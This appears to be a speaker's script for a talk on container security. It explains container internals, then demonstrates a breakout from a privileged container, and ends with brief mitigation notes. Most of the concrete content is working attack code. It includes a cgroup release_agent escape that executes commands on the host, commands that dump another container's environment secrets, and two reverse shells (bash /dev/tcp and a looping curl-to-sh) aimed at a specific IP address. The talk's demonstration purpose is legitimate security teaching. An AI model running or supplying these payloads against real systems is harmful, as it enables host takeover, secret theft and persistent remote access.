# Script

# Container Security; Or, on how to became a crypto billionaire





# Intro
- Goal not to show how to break out of containers, but to show the dangers of not mitigating it. 
- Understanding containers in order to protect workload
- What is a container 
    1. Namespaces (what a process can see)
        - Mount
        - UTS (hostname)
        - IPC (posix message queues)
        - NETWORK (network, IP, routing tables, firewall rules, sockets, etc.)
        - PID (Process ID, PID-to-process)
        - CGORUP (system resource)
        - USER (Kernel UIDs, GIDs)
        - TIME (system clock)
    2. Cgroups (system resource limits)
    3. Union File system (overlayfs)
    
- What is container breakout, how is it commonly achieved?
    - privileged or SYS_ADMIN cap
    - run as root
    - shell access or critical vulnerability in app that provides Arbitrary Code Execution


## Run a "container" without Docker using Shell



## Breakout Walkthrough

1. We are root. Check running processes
    `ps afx`
2. We are namespaced, but are we a container?
    `cat /proc/1/mountinfo`
3. We are a container, but what kernel privileges do we have?
    `grep Cap /proc/1/status`
4. What's the cap value mean?
    `exit`
    `capsh --decode=<HEX>`
5. We are running as ROOT in a CONTAINER with full PRIVILEGES and no BOUNDARIES.
6. Breakout



# Breaking out of a container
## Running as privileged
- Running as privileged

## Demo with NFS server
- Show Kubernetes NFS document
- Run demo
  1. Deploy NFS server
  2. Exec into container
  3. Basic breakout - Show host processes
  4. Show envvar secrets of another container
  5. Run a new docker container
    - Show running, show that it doesn't appear in GKE workloads, connect to it.
  6. Run reverse shell from host


```shell
bash -i >& /dev/tcp/147.182.165.208/80 0>&1 &
```


```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps -afx > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```


```shell
echo '#!/bin/sh' > /cmd
echo "cat /proc/1762076/environ > $host_path/output.environ" >> /cmd
echo "cat /proc/103541/mounts > $host_path/output.mounts" >> /cmd
echo "ls /proc/103541 > $host_path/output.proc" >> /cmd
echo "ls /var/lib/docker/overlay2 > $host_path/output.o2" >> /cmd
echo "docker run -d --privileged nginx > $host_path/output.dockerrun4" >> /cmd
echo "docker ps > $host_path/output.dockerps" >> /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```


```shell
echo '#!/bin/sh' > /cmd
echo "cat /proc/762102/environ > $host_path/output.environ" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```


```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "while true; do curl https://reverse-shell.sh/147.182.165.208:80 | sh; done > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

```


# Mitigating attacks
- OPA / PSPs
  - Quick review of OPA, PSP, or both
- Kernel Security Modules (AppArmor/SELinux)
  - Review of AppArmor profile
  - Tools for generating AppArmor profiles
- ossec (limit syscalls)
  - strace to capture syscalls


### words
- enumerate
- enumeration


```shell
enumerate

process of having AppSec add service account




Enable PSP features (PSP) using gcloud
Verify PSP exists 
POD delete command
Pod Create command

